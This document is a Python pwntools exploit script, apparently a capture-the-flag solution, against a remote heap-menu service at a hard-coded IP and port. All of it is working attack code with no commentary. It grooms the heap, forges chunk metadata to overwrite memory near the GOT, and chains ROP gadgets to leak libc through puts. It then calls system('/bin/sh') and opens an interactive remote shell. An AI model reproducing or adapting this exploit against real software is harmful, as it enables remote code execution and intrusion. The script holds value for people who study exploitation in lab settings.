#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host = "10.211.55.13"
port = 8888
host = "54.65.133.128"
port = 1412
r = remote(host,port)


# Need to bruteforce 1/16 probabilit

def alloc(size,data,choice,append=None):
    r.recvuntil("choice:")
    if append :
        r.send("1" + append)
    else :
        r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(data)
    r.recvuntil("(Y/n)")
    r.sendline(choice)

def free():
    r.recvuntil(":")
    r.sendline("2")

context.arch = "amd64"
buf = 0x00603000-0x200
buf1 = 0x602028
read_input = 0x0000000000400896
puts = 0x400758
pop_rsp_r13_r14_r15 = 0x0000000000400d4d
pop_rdi = 0x0000000000400d53
pop_rsi_r15 = 0x0000000000400d51
pop3ret = 0x0000000000400c4f
free_got = 0x000000000601f90
for i in range(12):
    alloc(0x21000,"da","y")
alloc(0x28000,"da","y")
alloc(0x1c0000,"orange","y")
free()
alloc(32,"da","y")
free()
alloc(48,"da","y")
free()
alloc(64,"da","y")
free()
alloc(80,"da","y")
free()
alloc(96,"gg","y")
alloc(0x1c0000,"orange","y")
alloc(32,"da","y")
free()
alloc(0x60,"da","y")
free()
alloc(32,"da","n")
r.recvuntil(":")
r.sendline("100")
r.recvuntil(":")
r.sendline("a"*0x20 + p64(0) + p64(0x71) + p64(0x60201d))
r.recvuntil(")")
r.sendline("y")
alloc(0x60,"da","y")
alloc(32,"da","y")
free()
rop = flat([pop_rdi,buf,read_input,pop_rsp_r13_r14_r15,buf])
alloc(0x60,"aaa" + "b"*0x10 + rop,"y")
alloc(32,"daaaaaaaaa","n")
r.recvuntil(":")
r.sendline("100")
r.recvuntil(":")
r.send("a"*0x20 + p64(0) + p64(0x51) + p64(0) + "\x90\x11")
r.recvuntil("(Y/n)")
r.sendline("y")

alloc(0x1c1000-0x10,"\x00"*0x950 + p64(pop_rsi_r15),"y")
r.recvuntil(":")
r.send("1" + "a"*7 + "b"*8 + p64(buf1)[:-1])
r.recvuntil(":")

r.sendline(str(pop_rsp_r13_r14_r15))
time.sleep(0.2)
rop2 = flat([0,0,0,pop_rdi,free_got,puts,pop_rdi,buf+8*9,read_input])
r.sendline(rop2)
libc = u64(r.recvuntil("\n").strip().ljust(8,"\x00")) - 0x86ce0
print "libc:",hex(libc)
system = libc + 0x456a0
sh = libc + 0x18ac40
rop3 = flat([pop_rdi,sh,system])
r.sendline(rop3)
r.interactive()
